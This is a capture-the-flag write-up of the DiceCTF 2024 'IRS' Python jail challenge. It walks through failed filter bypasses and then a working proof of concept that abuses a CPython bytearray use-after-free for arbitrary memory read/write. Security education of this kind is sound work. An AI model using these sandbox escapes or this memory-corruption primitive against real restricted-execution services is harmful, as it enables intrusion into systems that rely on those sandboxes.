---
layout: post
title: "[DiceCTF 2024] IRS/diligent-auditor"
author: lydxn
---

This writeup is co-authored with [desp](../../authors/Desp).

# IRS [481]

## Challenge

 - Author: kmh
 - Solves: 2

> *The Internal Restrictedpythonexecution Service has established a new automated auditing pipeline. Can you
> remain undetected?*
>
> `nc mc.ax 31337`

Attachments:
[`irs.c`](https://static.dicega.ng/uploads/d08414a0010847008faece0bc12ec4a746693303c1bffc28960fcbbc96a01d64/irs.c)
[`irs`](https://static.dicega.ng/uploads/da7e724dfc3d05e77cc3543ea18600c87a1d64ca13f68ad5b575614bf4453085/irs)
[`audit.py`](https://static.dicega.ng/uploads/934719eaa4b1598b0a43ebb5ac6ac4244ca6139b0fd5d46cc0f00bef939e8173/audit.py)
[`build.sh`](https://static.dicega.ng/uploads/07dd025e37fcb1a54c99bc7d5d266216b33244737b147e108497dea435095029/build.sh)
[`run.sh`](https://static.dicega.ng/uploads/94c2bf49a136d49ebef810c73dc638bc1f7c02ac3eea3ba2ea347917d6edda50/run.sh)
[`Dockerfile`](https://static.dicega.ng/uploads/e2f9c5fcdffc03011854d942e891b7a15e3216850713f2006cba442b8072badf/Dockerfile)

## Analysis

We're presented with the following `audit.py` file:

```py
import ast
import irs

dangerous = lambda s: any(d in s for d in ("__", "attr"))
dangerous_attr = lambda s: dangerous(s) or s in dir(dict)
dangerous_nodes = (ast.Starred, ast.GeneratorExp, ast.Match, ast.With, ast.AsyncWith, ast.keyword, ast.AugAssign)

print("Welcome to the IRS! Enter your code:")
c = ""
while l := input("> "): c += l + "\n"
root = ast.parse(c)
for node in ast.walk(root):
    for child in ast.iter_child_nodes(node):
        child.parent = node
if not any(type(n) in dangerous_nodes or
           type(n) is ast.Name and dangerous(n.id) or
           type(n) is ast.Attribute and dangerous_attr(n.attr) or
           type(n) is ast.Subscript and type(n.parent) is not ast.Delete or
           type(n) is ast.arguments and (n.kwarg or n.vararg)
           for n in ast.walk(root)):
    del __builtins__.__loader__
    del __builtins__.__import__
    del __builtins__.__spec__
    irs.audit()
    exec(c, {}, {})
```

The program accepts a multi-line input through `c`, and runs it through a series of checks to make sure
the code isn't *dangerous*. At the end, it runs the input as Python code through an `exec`.

In jail challenges like this, the flag is typically located somewhere on the filesystem, meaning we'll likely
need to obtain a shell to access it.

Analyzing the code further, we find that it uses the `ast` module to disallow certain Python constructs in
our code. More specifically, it bans

 1. Names and attributes containing `__` or `attr`, meaning we can't use dunder attributes, as
 well as the `getattr()` and `setattr()` built-ins
 2. Attributes whose names are found in `dir(dict)`
 3. Subscript notation, with the *exception* of `del a[b]`
 4. `*args` and `**kwargs` in function parameters
 5. Starred expressions - `ast.Starred`, and keyword arguments - `ast.keyword`
 6. Generator expressions - `ast.GeneratorExp`
 7. Match statements - `ast.Match`
 8. With statements - `ast.With/ast.AsyncWith`
 9. Augmented assignment - `ast.AugAssign`

The built-ins `__loader__`, `__import__`, `__spec__` are also deleted prior to executing the program.

The last thing it does is run the C extension `irs.audit()`. From the `irs.c` attachment given, we see that
it adds an audit hook which causes the program to terminate upon triggering an
[audit event](https://docs.python.org/3/library/audit_events.html):

```c
static int audit(const char *event, PyObject *args, void *userData) {
    static int running = 0;
    if (running) {
        exit(0);
    }
    if (!running && !strcmp(event, "exec")) running = 1;
    return 0;
}

static PyObject* irs_audit(PyObject *self, PyObject *args) {
    PySys_AddAuditHook(audit, NULL);
    Py_RETURN_NONE;
}
```

## Initial thoughts

Given the fact that `__builtins__` was not *completely* wiped, which was often the case in these challenges,
we examined the available built-ins for something potentially useful. However, all of the useful ones
(`breakpoint()`, `exec()`, etc.) conveniently triggered the audit hook.

`import xxx` was not a possibility either since it uses `__builtins__.__import__` under the hood, which was
**deleted** earlier. If we *could* import something, the audit hook still blocks `os.system()` and other such
functions making our life difficult, but at least there would be something to work with.

Other than directly importing, the `object.__subclasses__()` trick *would* allow us to gain access to a bunch
of imported modules, if it were not for the `__` restriction.

Perhaps we could abuse generator frames in order to gain access to the global scope. Via some trickery
with yield functions to bypass the `ast.GeneratorExp` condition, this seemed promising:

```py
def f():
    global x, frame
    frame = x.gi_frame.f_back.f_back
    yield
x = f()
x.send(None)
print(frame)
```

Yet to our dismay, nothing was printed. After some confusion, we realized that the audit hook probably also
banned generator frames!

Well, back to the drawing board.

## More futile attempts

Although `getattr()` is blocked, we supposed there could be a way to get around it. Indeed, we knew of a trick
where structural pattern matching can be abused to work as a `getattr()`:

```py
match object:
    case type(__subclasses__=subclasses):
        print(subclasses())
```

however `ast.Match` had clearly been banned, making this a dead end.

Python also has a format string vulnerability in which attributes can be accessed by executing a format string:

```py
subclasses = '{0.__subclasses__}'.format(object)
```

Given that it returns the attribute as a **string** rather than the object itself though, this approach also
did not appear very promising.

In theory, `getattr()` could be obtained dynamically from `__builtins__['getattr']`, but this was assuming
that we could even get a hold of `__builtins__` with the `__` restriction still present. Even then, it was not
clear how to bypass `ast.Subscript` *and* the `dir(dict)` check at the same time.

## Entering the dark side

At this point, we were running out of options, and we were getting *desp*erate. So we, yes, resorted to the
only option left to our knowledge: **memory corruption**.

One such bug we found, [Issue #91153](https://github.com/python/cpython/issues/91153), seemed to be a
perfect candidate. Hmm, a Use-After-Free within `bytearray.__index__`, discovered and... fixed in 2022?!

Ok so, maybe this is not going to work, but let's try it out anyway:

```py
# uaf.py

class B:
    def __index__(self):
        global memory
        uaf.clear()
        memory = bytearray()
        uaf.extend([0] * 56)
        return 1

uaf = bytearray(56)
uaf[23] = B()
memory[id(250) + 24] = 100
print(250)
```
---
```sh
$ python3.12 uaf.py
100
```

Ok, that's a bit strange... 250 does not equal 100. But we're on the latest version of Python.

Well, it turns out that the bug *wasn't* fixed, and it had been sitting there the whole time!

## UAF exploit

It's not immediately clear where the bug is, but we can make some reasonable assumptions from looking at the
code. First, the `__index__` method behaves a bit like a cast to an integer, meaning it coerces `B()` to a
numeric value under certain circumstances (like assigning to a bytearray).

Therefore, the line that sets `uaf[23] = B()` actually means `uaf[23] = 1`, only the coercion is done *during*
the assignment. This implies that something is happening between the time `uaf[23]` is assigned and the
suspicious `.clear()`/`.extend()` code is executed, confusing the interpreter somehow.

For a better understanding of how the bug works, we must dig into the CPython source code:

```c
/* Objects/bytearrayobject.c */

static int
bytearray_ass_subscript(PyByteArrayObject *self, PyObject *index, PyObject *values)
{
    Py_ssize_t start, stop, step, slicelen, needed;
    char *buf, *bytes;
    buf = PyByteArray_AS_STRING(self);

    if (_PyIndex_Check(index)) {
        Py_ssize_t i = PyNumber_AsSsize_t(index, PyExc_IndexError);

        if (i == -1 && PyErr_Occurred()) {
            return -1;
        }

        int ival = -1;

        // GH-91153: We need to do this *before* the size check, in case values
        // has a nasty __index__ method that changes the size of the bytearray:
        if (values && !_getbytevalue(values, &ival)) {
            return -1;
        }

        if (i < 0) {
            i += PyByteArray_GET_SIZE(self);
        }

        if (i < 0 || i >= Py_SIZE(self)) {
            PyErr_SetString(PyExc_IndexError, "bytearray index out of range");
            return -1;
        }

        if (values == NULL) {
            /* Fall through to slice assignment */
            start = i;
            stop = i + 1;
            step = 1;
            slicelen = 1;
        }
        else {
            assert(0 <= ival && ival < 256);
            buf[i] = (char)ival;
            return 0;
        }
    }
    ...
}
```

Let's construct an execution timeline of what happens from start to end of the Python program (credits to
[@nneonneo](../../../authors/Nneonneo) for the dissection):

 1. Allocate `uaf`, a bytearray with a 56-byte backing buffer.
 2. Call `bytearray_ass_subscript(uaf, 23, B())`.
 3. `buf = PyByteArray_AS_STRING(self);` caches `buf` to point to the backing buffer.
 4. `_getbytevalue` is called to turn `B()` into a byte, which invokes `B.__index__`.
 5. `B.__index__` clears `uaf`, which frees its backing buffer.
 6. `B.__index__` constructs a new bytearray called `memory`, which exactly occupies the memory of the freed
 backing buffer (still cached in `buf`).
 7. `B.__index__` extends `uaf` by 56 bytes so the size appears unchanged.
 8. `buf[i] = (char)ival;` assigns 1 (`B()`'s return value) to index 23 of the freed buffer, overwriting
 `memory`'s size field, `ob_size`.
 9. `memory` now has a NULL backing buffer (no buffer is initially allocated for an empty bytearray) with an
 absurd size field.

Thus, `memory` effectively becomes a buffer that stretches the entirety of virtual memory, allowing us to
read/write to any arbitrary address.

`uaf[id(250) + 24] = 100` simply makes use of the fact that small integers are cached in a `small_ints[]`
array in memory, and reassigning offset 24 overwrites the value field.

The code also includes a `GH-91153:` comment of the bug fix. If we read it carefully, we realize that it
does *nothing* to prevent this exploit from working, except forcing Step 7) so as to trick Python into
thinking the bytearray hadn't changed size.

This is all trivially fixable by simply not caching `buf`.
